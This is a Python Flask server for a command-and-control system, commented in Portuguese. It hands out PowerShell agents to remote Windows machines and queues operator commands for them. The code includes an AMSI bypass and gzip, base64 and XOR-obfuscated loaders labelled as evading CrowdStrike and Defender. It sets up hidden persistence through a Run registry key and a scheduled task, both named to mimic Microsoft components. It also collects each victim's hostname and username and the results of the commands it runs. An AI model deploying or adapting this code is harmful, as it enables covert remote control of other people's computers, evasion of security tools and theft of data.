from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
from database import Database
import os
import json
import hashlib
import secrets
from datetime import datetime, timedelta
import threading
import time

app = Flask(__name__)
CORS(app)

# Configurações de segurança
SECRET_TOKEN = os.environ.get('C2_SECRET_TOKEN', secrets.token_hex(32))
ADMIN_PASSWORD = os.environ.get('C2_ADMIN_PASSWORD', 'admin123')  # MUDE ISSO!

# Banco de dados
db = Database()

# Armazenamento de comandos pendentes (em memória) - SIMPLIFICADO
pending_commands = {}  # {client_id: {command_id: command_data}}
command_results = {}  # {command_id: result}
command_timestamps = {}  # {command_id: timestamp}

# Limpar resultados antigos (mais de 5 minutos)
def cleanup_old_results():
    while True:
        try:
            time.sleep(60)  # Verificar a cada 1 minuto
            now = datetime.now()
            expired_commands = []

            for cmd_id, timestamp in list(command_timestamps.items()):
                if (now - timestamp).total_seconds() > 300:  # 5 minutos
                    expired_commands.append(cmd_id)

            for cmd_id in expired_commands:
                if cmd_id in command_results:
                    del command_results[cmd_id]
                if cmd_id in command_timestamps:
                    del command_timestamps[cmd_id]
        except:
            pass

# Iniciar thread de limpeza
cleanup_thread = threading.Thread(target=cleanup_old_results, daemon=True)
cleanup_thread.start()

# Função para obter país do IP (simplificada)
def get_country_from_ip(ip):
    # Aqui você pode integrar com GeoIP2 ou API externa
    # Por simplicidade, retornando "Unknown"
    try:
        import requests
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=2)
        if response.status_code == 200:
            data = response.json()
            return data.get('country', 'Unknown')
    except:
        pass
    return 'Unknown'

# Endpoint de instalação - ONE LINER (PowerShell - SEM Python!)
@app.route('/install', methods=['GET'])
def install():
    """Endpoint que retorna o código do agente PowerShell para execução remota"""
    with open('agent_payload.ps1', 'r', encoding='utf-8') as f:
        agent_code = f.read()

    # Substitui o SERVER_URL no código
    server_url = request.host_url.rstrip('/')
    agent_code = agent_code.replace('SERVER_URL_PLACEHOLDER', server_url)
    agent_code = agent_code.replace('SECRET_TOKEN_PLACEHOLDER', SECRET_TOKEN)

    return agent_code, 200, {'Content-Type': 'text/plain; charset=utf-8'}

# Endpoint OFUSCADO - Bypass Antivírus AVANÇADO (CrowdStrike, Defender, etc)
@app.route('/i', methods=['GET'])
def install_bypass():
    """Endpoint ofuscado para bypass de antivírus com AMSI bypass"""
    import base64
    import gzip

    with open('agent_payload.ps1', 'r', encoding='utf-8') as f:
        agent_code = f.read()

    server_url = request.host_url.rstrip('/')
    agent_code = agent_code.replace('SERVER_URL_PLACEHOLDER', server_url)
    agent_code = agent_code.replace('SECRET_TOKEN_PLACEHOLDER', SECRET_TOKEN)

    # Comprimir + Base64 (dupla camada)
    compressed = gzip.compress(agent_code.encode('utf-8'))
    encoded = base64.b64encode(compressed).decode('utf-8')

    # AMSI Bypass + Loader ofuscado
    amsi_bypass = """
$a=[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+[char]109+[char]115+[char]105)+'Utils');
$b=$a.GetField($([char]97+[char]109+[char]115+[char]105)+'InitFailed','NonPublic,Static');
$b.SetValue($null,$true);
"""

    # Loader com decompressão
    loader = f"""{amsi_bypass}
$d=[System.Convert]::FromBase64String('{encoded}');
$m=New-Object System.IO.MemoryStream(,$d);
$g=New-Object System.IO.Compression.GzipStream($m,[System.IO.Compression.CompressionMode]::Decompress);
$s=New-Object System.IO.StreamReader($g);
$c=$s.ReadToEnd();
$s.Close();$g.Close();$m.Close();
iex $c
"""

    return loader, 200, {'Content-Type': 'text/plain; charset=utf-8'}

# Endpoint STEALTH - CrowdStrike Bypass (SEM IEX!) + PERSISTÊNCIA AUTOMÁTICA
@app.route('/s', methods=['GET'])
def install_stealth():
    """Endpoint stealth - SEM usar iex diretamente + Instalação automática invisível"""
    import base64
    import gzip

    with open('agent_stealth.ps1', 'r', encoding='utf-8') as f:
        agent_code = f.read()

    server_url = request.host_url.rstrip('/')
    client_id = secrets.token_hex(16)

    # Remover as linhas de inicialização antigas do agent_code
    # (vamos injetar as variáveis antes)
    lines = agent_code.split('\n')
    # Pular linhas que começam com comentários de cabeçalho
    clean_code = '\n'.join(lines)

    # Injetar variáveis no código
    agent_with_vars = f"""
$s1='{server_url}'
$s2='{SECRET_TOKEN}'
$s3='{client_id}'

{clean_code}
"""

    # Comprimir + Base64
    compressed = gzip.compress(agent_with_vars.encode('utf-8'))
    encoded = base64.b64encode(compressed).decode('utf-8')

    # Loader com persistência automática (SEM precisar de admin)
    loader = f"""
# Decodificar e executar agente
$d=[Convert]::FromBase64String('{encoded}');
$m=New-Object IO.MemoryStream(,$d);
$g=New-Object IO.Compression.GzipStream($m,[IO.Compression.CompressionMode]::Decompress);
$r=New-Object IO.StreamReader($g);
$c=$r.ReadToEnd();
$r.Close();$g.Close();$m.Close();

# Instalar persistência (locais com permissão garantida)
try{{
    # Usar TEMP (sempre tem permissão)
    $installPath="$env:TEMP\\Microsoft\\Windows"
    if(!(Test-Path $installPath)){{New-Item -ItemType Directory -Path $installPath -Force|Out-Null}}
    $scriptPath="$installPath\\UpdateCheck.ps1"
    Set-Content -Path $scriptPath -Value $c -Force

    # Tentar ocultar (se falhar, não problema)
    try{{(Get-Item $installPath -Force).Attributes='Hidden'}}catch{{}}
    try{{(Get-Item $scriptPath -Force).Attributes='Hidden'}}catch{{}}

    # Registro (SEMPRE funciona sem admin)
    $regPath="HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsSecurityHealth" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue

    # Tentar criar tarefa agendada (se tiver permissão)
    try{{
        $action=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File `"$scriptPath`""
        $trigger=New-ScheduledTaskTrigger -AtLogOn
        $settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateCore" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue|Out-Null
    }}catch{{}}

    # Iniciar processo invisível em background
    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File `"$scriptPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
}}catch{{}}

# Executar agente atual (temporário)
$sb=[ScriptBlock]::Create($c);
& $sb
"""

    return loader, 200, {'Content-Type': 'text/plain; charset=utf-8'}

# Endpoint XOR - Alternativa (SEM IEX)
@app.route('/x', methods=['GET'])
def install_xor():
    """Endpoint XOR encoding - SEM iex"""
    import base64

    with open('agent_stealth.ps1', 'r', encoding='utf-8') as f:
        agent_code = f.read()

    server_url = request.host_url.rstrip('/')
    agent_code = agent_code.replace('SERVER_URL_PLACEHOLDER', server_url)
    agent_code = agent_code.replace('SECRET_TOKEN_PLACEHOLDER', SECRET_TOKEN)

    # XOR encoding
    key = 0x7A
    xored = bytes([b ^ key for b in agent_code.encode('utf-8')])
    encoded = base64.b64encode(xored).decode('utf-8')

    # Loader XOR SEM iex
    loader = f"""
$k=0x7A;
$b=[Convert]::FromBase64String('{encoded}');
$c=@();
for($i=0;$i -lt $b.Length;$i++){{$c+=[char]($b[$i] -bxor $k)}};
$e=$c -join '';
$sb=[ScriptBlock]::Create($e);
& $sb
"""

    return loader, 200, {'Content-Type': 'text/plain; charset=utf-8'}

# Endpoint DOWNLOAD - Retorna script direto (para download manual)
@app.route('/d', methods=['GET'])
def download_script():
    """Endpoint para download direto do script"""
    with open('agent_stealth.ps1', 'r', encoding='utf-8') as f:
        agent_code = f.read()

    server_url = request.host_url.rstrip('/')
    agent_code = agent_code.replace('SERVER_URL_PLACEHOLDER', server_url)
    agent_code = agent_code.replace('SECRET_TOKEN_PLACEHOLDER', SECRET_TOKEN)

    return agent_code, 200, {'Content-Type': 'text/plain; charset=utf-8'}

# Endpoint de instalação Python (legado - para quem tem Python instalado)
@app.route('/install-python', methods=['GET'])
def install_python():
    """Endpoint que retorna o código do agente Python (legado)"""
    with open('agent_payload.py', 'r', encoding='utf-8') as f:
        agent_code = f.read()

    # Substitui o SERVER_URL no código
    server_url = request.host_url.rstrip('/')
    agent_code = agent_code.replace('SERVER_URL_PLACEHOLDER', server_url)
    agent_code = agent_code.replace('SECRET_TOKEN_PLACEHOLDER', SECRET_TOKEN)

    return agent_code, 200, {'Content-Type': 'text/plain; charset=utf-8'}

# Endpoint de checkin do cliente
@app.route('/api/checkin', methods=['POST'])
def checkin():
    """Cliente envia informações e recebe comandos pendentes"""
    data = request.json

    # Validar token
    if data.get('token') != SECRET_TOKEN:
        return jsonify({'error': 'Unauthorized'}), 401

    # Obter IP real do cliente
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Preparar dados do cliente
    client_data = {
        'client_id': data['client_id'],
        'ip_address': client_ip,
        'country': get_country_from_ip(client_ip),
        'hostname': data['hostname'],
        'username': data['username'],
        'os_version': data['os_version']
    }

    # Salvar/atualizar no banco
    db.add_or_update_client(client_data)
    db.add_log(data['client_id'], 'checkin', f"IP: {client_ip}")

    # Verificar se há comandos pendentes
    client_id = data['client_id']

    # Pegar APENAS O PRIMEIRO comando pendente
    if client_id in pending_commands and pending_commands[client_id]:
        cmd_id, cmd_data = list(pending_commands[client_id].items())[0]
        return jsonify({
            'status': 'ok',
            'command': cmd_data,
            'command_id': cmd_id
        })

    return jsonify({'status': 'ok'})

# Endpoint para receber resultados de comandos
@app.route('/api/result', methods=['POST'])
def receive_result():
    """Cliente envia resultado de comando executado"""
    data = request.json

    if data.get('token') != SECRET_TOKEN:
        return jsonify({'error': 'Unauthorized'}), 401

    client_id = data['client_id']
    command_id = data['command_id']
    result = data.get('result', '')
    command_type = data.get('command', 'unknown')

    # Converter result para string
    if isinstance(result, dict) or isinstance(result, list):
        result_str = str(result)
    else:
        result_str = str(result)

    # Converter command para string se for objeto
    if isinstance(command_type, dict):
        command_str = command_type.get('type', 'unknown')
    else:
        command_str = str(command_type)

    # Salvar resultado
    command_results[command_id] = result_str
    db.add_command(client_id, command_str, result_str)

    # Remover comando da fila
    if client_id in pending_commands and command_id in pending_commands[client_id]:
        del pending_commands[client_id][command_id]
        if not pending_commands[client_id]:
            del pending_commands[client_id]

    return jsonify({'status': 'ok'})

# Dashboard Web
@app.route('/')
def dashboard():
    """Página principal do dashboard"""
    return render_template('dashboard.html')

# API para obter lista de clientes
@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Retorna lista de todos os clientes"""
    # Autenticação básica (você pode melhorar isso)
    auth = request.headers.get('Authorization')
    if auth != f'Bearer {ADMIN_PASSWORD}':
        return jsonify({'error': 'Unauthorized'}), 401
    
    clients = db.get_all_clients()
    
    # Marcar como offline se não fez checkin nos últimos 5 minutos
    for client in clients:
        last_seen = datetime.fromisoformat(client['last_seen'])
        if datetime.now() - last_seen > timedelta(minutes=5):
            client['status'] = 'offline'
    
    return jsonify(clients)

# API para enviar comando para cliente
@app.route('/api/command', methods=['POST'])
def send_command():
    """Envia comando para um cliente específico"""
    auth = request.headers.get('Authorization')
    if auth != f'Bearer {ADMIN_PASSWORD}':
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.json
    client_id = data['client_id']
    command = data['command']

    # Adicionar comando à fila
    if client_id not in pending_commands:
        pending_commands[client_id] = {}

    command_id = secrets.token_hex(8)
    command_timestamps[command_id] = datetime.now()

    pending_commands[client_id][command_id] = {
        'type': command['type'],
        'params': command.get('params', {})
    }

    db.add_log(client_id, 'command_sent', f"Type: {command['type']}")

    return jsonify({'status': 'ok', 'command_id': command_id})

# API para obter logs
@app.route('/api/logs/<client_id>', methods=['GET'])
def get_logs(client_id):
    """Retorna logs de um cliente"""
    auth = request.headers.get('Authorization')
    if auth != f'Bearer {ADMIN_PASSWORD}':
        return jsonify({'error': 'Unauthorized'}), 401

    logs = db.get_logs(client_id)
    return jsonify(logs)

# API para obter resultado de comando
@app.route('/api/result/<command_id>', methods=['GET'])
def get_result(command_id):
    """Retorna resultado de um comando específico"""
    auth = request.headers.get('Authorization')
    if auth != f'Bearer {ADMIN_PASSWORD}':
        return jsonify({'error': 'Unauthorized'}), 401

    result = command_results.get(command_id)
    if result:
        return jsonify({'result': result})
    else:
        return jsonify({'result': None})

# API para remover cliente
@app.route('/api/client/<client_id>', methods=['DELETE'])
def remove_client(client_id):
    """Remove um cliente e todos os seus dados"""
    auth = request.headers.get('Authorization')
    if auth != f'Bearer {ADMIN_PASSWORD}':
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        # Remover comandos pendentes
        if client_id in pending_commands:
            del pending_commands[client_id]

        # Remover do banco de dados
        db.remove_client(client_id)

        return jsonify({'status': 'ok', 'message': 'Cliente removido com sucesso'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    print("=" * 60)
    print("🚀 C2 ADMIN SYSTEM - SERVIDOR INICIADO")
    print("=" * 60)
    print(f"📡 Secret Token: {SECRET_TOKEN}")
    print(f"🔑 Admin Password: {ADMIN_PASSWORD}")
    print(f"⚠️  MUDE A SENHA EM PRODUÇÃO!")
    print("=" * 60)
    
    # Criar arquivo de payload se não existir
    if not os.path.exists('agent_payload.py'):
        print("⚠️  Arquivo agent_payload.py não encontrado!")
    
    app.run(host='0.0.0.0', port=5000, debug=False)

